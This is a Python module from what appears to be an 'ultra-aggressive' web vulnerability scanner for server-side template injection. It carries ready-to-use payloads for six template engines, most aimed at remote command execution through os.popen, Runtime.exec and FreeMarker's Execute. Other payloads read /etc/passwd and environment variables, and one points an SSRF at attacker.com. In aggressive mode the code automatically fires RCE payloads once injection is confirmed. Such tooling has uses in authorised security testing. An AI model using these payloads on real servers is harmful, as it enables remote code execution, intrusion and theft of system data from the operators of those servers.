#!/usr/bin/env python3
"""
📝 TEMPLATE INJECTION ULTRA-AGRESSIF — OWASP A05:2025
SSTI (Server-Side Template Injection) - Jinja2, Twig, Smarty, Velocity
"""

import re
import time
from colorama import Fore, Style

class TemplateInjection:
    def __init__(self, engine, aggressive=False):
        self.engine = engine
        self.aggressive = aggressive
        self.vulns = []
    
    def scan(self, params=None):
        print(f"\n{Fore.CYAN}[📝 TEMPLATE INJECTION ULTRA-AGRESSIF] {Style.RESET_ALL}\n")
        params = params or getattr(self.engine, "discover_form_params", lambda: [])() or ["template", "name", "q", "search", "input", "page", "id"]
        
        # Payloads SSTI — calculs UNIQUES pour éviter FP (49, 64 = prix/IDs sur e-commerce)
        UNIQUE_A = '{{123*456}}'  # 56088 — improbable sur page normale
        ssti_payloads = {
            'jinja2': [
                UNIQUE_A,
                '{{config.items()}}',  # Config leak
                '{{''.__class__.__mro__[2].__subclasses__()}}',  # RCE
                '{{lipsum.__globals__.os.popen("id").read()}}',  # Command execution
                '{{get_flashed_messages.__globals__.__builtins__.__import__("os").popen("id").read()}}',
                '{{request.application.__globals__.__builtins__.__import__("os").popen("whoami").read()}}'
            ],
            'twig': [
                UNIQUE_A,
                '{{_self.env.setCache("ftp://attacker.com:2121")}}',  # SSRF
                '{{_self.env.registerUndefinedFilterCallback("exec")}}',  # RCE prep
                '{{["id"]|map("system")|join(",")}}',  # Command execution
                '{{["cat /etc/passwd"]|map("system")|join}}',
                '{{_self.loadFile("/etc/passwd")}}'
            ],
            'smarty': [
                '{$123*456}',
                '{php}system("id");{/php}',  # PHP execution
                '{if phpinfo()}{/if}',  # PHP info
                '{literal}phpinfo(){/literal}',
                '{$smarty.template_object->getTemplateFilepath()}',
                '{self::getStreamVariable("file")}'
            ],
            'velocity': [
                '#set($x=123*456)${x}',
                '#set($run=$class.inspect("java.lang.Runtime").getRuntime())#set($proc=$run.exec("id"))${proc}',
                '#set($exec=$class.forName("java.lang.Runtime").getRuntime().exec("whoami"))',
                '#set($stream=$class.forName("java.io.FileInputStream").newInstance("/etc/passwd"))',
                '${class.forName("java.lang.System").getProperties()}'
            ],
            'freemarker': [
                '${123*456}',
                '${"freemarker.template.utility.Execute"?new("id")}',
                '${"freemarker.template.utility.ObjectConstructor"?new("java.lang.Runtime")}',
                '${.globals["org.apache.freemarker.core.Configuration"].getNewBuiltinClassResolver()}',
                '${.data_model["key"]}'
            ],
            'thymeleaf': [
                '[[${123*456}]]',
                '[[${T(java.lang.Runtime).getRuntime().exec("id")}]]',
                '[[${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream())}]]',
                '[[${T(java.lang.System).getenv()}]]',
                '[[${#strings.listJoin(T(java.lang.Runtime).getRuntime().exec("ls").getInputStream()," ")}]]'
            ]
        }
        
        # Patterns de détection
        detection_patterns = {
            'jinja2': r'\{\{.*?\}\}',
            'twig': r'\{\{.*?\}\}',
            'smarty': r'\{.*?\}',
            'velocity': r'\$\{.*?\}',
            'freemarker': r'\$\{.*?\}',
            'thymeleaf': r'\[\[.*?\]\]'
        }
        
        for param in params:
            print(f"  → Test paramètre: {param}")
            
            for engine_name, payloads in ssti_payloads.items():
                for payload in payloads:
                    try:
                        # Construire URL avec payload
                        test_url = self.engine.build_url(param, payload)
                        
                        # Faire la requête
                        resp = self.engine.session.get(test_url, timeout=10)
                        
                        # Analyser la réponse (double confirmation math pour éviter FP)
                        vuln_info = self._analyze_ssti_response(resp, payload, engine_name, param, test_url)
                        if vuln_info and vuln_info.get('_candidate'):
                            if self._confirm_ssti_with_88(param, engine_name, test_url):
                                v = {'type': 'template_injection', 'param': param, 'payload': payload, 'engine': engine_name,
                                     'evidence': 'Template math confirmé (123*456=56088 et 111*111=12321)', 'url': test_url}
                                self.vulns.append(v)
                                print(f"    {Fore.RED}[💥 SSTI CONFIRMÉ] {param} ({engine_name}){Style.RESET_ALL}")
                                print(f"      Preuve: 123*456=56088 et 111*111=12321")
                                if self.aggressive:
                                    rce_payloads = self._get_rce_payloads(engine_name)
                                    for rce_payload in rce_payloads[:2]:
                                        try:
                                            rce_url = self.engine.build_url(param, rce_payload)
                                            rce_resp = self.engine.session.get(rce_url, timeout=5)
                                            if self._check_rce_success(rce_resp):
                                                print(f"    {Fore.YELLOW}[⚡ RCE CONFIRMÉ] {Style.RESET_ALL}")
                                                self.vulns.append({'type': 'template_injection_rce', 'param': param, 'payload': rce_payload, 'engine': engine_name, 'evidence': 'RCE', 'url': rce_url})
                                                break
                                        except Exception:
                                            pass
                            break
                        elif vuln_info and vuln_info.get('type') == 'template_injection':
                            self.vulns.append(vuln_info)
                            print(f"    {Fore.RED}[💥 SSTI CONFIRMÉ] {param} ({engine_name}){Style.RESET_ALL}")
                            print(f"      Preuve: {vuln_info.get('evidence', '')}")
                            break
                            
                    except Exception as e:
                        continue
        
        return self.vulns
    
    def _analyze_ssti_response(self, resp, payload, engine_name, param, url):
        """SSTI — 123*456=56088 (unique, évite FP prix/IDs e-commerce)."""
        if '123*456' in payload or '123*456' in str(payload):
            if '56088' in resp.text and '123*456' not in resp.text:
                return {'_candidate': True, 'param': param, 'engine': engine_name}
        # Erreurs template explicites (patterns stricts)
        for pat, label in [(r'jinja2\.(exceptions\.)?', 'Jinja2'), (r'twig\.(exception|error)', 'Twig'), (r'smarty\.(exception|error)', 'Smarty'), (r'velocity\.(exception|error)', 'Velocity'), (r'template.*syntax.*error', 'syntax')]:
            if re.search(pat, resp.text, re.IGNORECASE):
                return {'type': 'template_injection', 'param': param, 'payload': payload, 'engine': engine_name, 'evidence': f'Erreur template {label}', 'url': url}
        return None

    def _confirm_ssti_with_88(self, param, engine_name, url):
        """Confirme SSTI en testant 111*111 -> 12321 (unique)."""
        for p in ['{{111*111}}', '${111*111}', '{$111*111}', '[[${111*111}]]']:
            try:
                u = self.engine.build_url(param, p)
                r = self.engine.session.get(u, timeout=10)
                if '12321' in r.text and '111*111' not in r.text:
                    return True
            except Exception:
                pass
        return False
    
    def _get_rce_payloads(self, engine_name):
        """Payloads RCE spécifiques par moteur"""
        rce_payloads = {
            'jinja2': [
                '{{lipsum.__globals__.os.popen("whoami").read()}}',
                '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
                '{{''.__class__.__mro__[2].__subclasses__()[407]("cat /etc/passwd", shell=True).read()}}'
            ],
            'twig': [
                '{{["id"]|map("system")|join(",")}}',
                '{{["cat /etc/passwd"]|map("system")|join}}',
                '{{_self.env.registerUndefinedFilterCallback("exec")}}{{["whoami"]|map("exec")|join}}'
            ],
            'smarty': [
                '{php}system("whoami");{/php}',
                '{if system("id")}{/if}',
                '{literal}system("uname -a");{/literal}'
            ],
            'velocity': [
                '#set($run=$class.inspect("java.lang.Runtime").getRuntime())#set($proc=$run.exec("whoami"))${proc}',
                '#set($exec=$class.forName("java.lang.Runtime").getRuntime().exec("id"))${exec}',
                '#set($stream=$class.forName("java.io.FileInputStream").newInstance("/etc/passwd"))${stream}'
            ],
            'freemarker': [
                '${"freemarker.template.utility.Execute"?new("whoami")}',
                '${"freemarker.template.utility.Execute"?new("id")}',
                '${"freemarker.template.utility.Execute"?new("cat /etc/passwd")}'
            ],
            'thymeleaf': [
                '[[${T(java.lang.Runtime).getRuntime().exec("whoami")}]]',
                '[[${T(java.lang.Runtime).getRuntime().exec("id")}]]',
                '[[${#strings.listJoin(T(java.lang.Runtime).getRuntime().exec("ls").getInputStream()," ")}]]'
            ]
        }
        return rce_payloads.get(engine_name, [])
    
    def _check_rce_success(self, resp):
        """Vérifier si le RCE a réussi"""
        rce_indicators = [
            'root:', 'www-data:', 'uid=', 'gid=', 
            'bin/', 'etc/', 'proc/', 'dev/', 'usr/', 'var/',
            'Darwin', 'Linux', 'Windows', 'MINGW'
        ]
        return any(indicator in resp.text for indicator in rce_indicators)
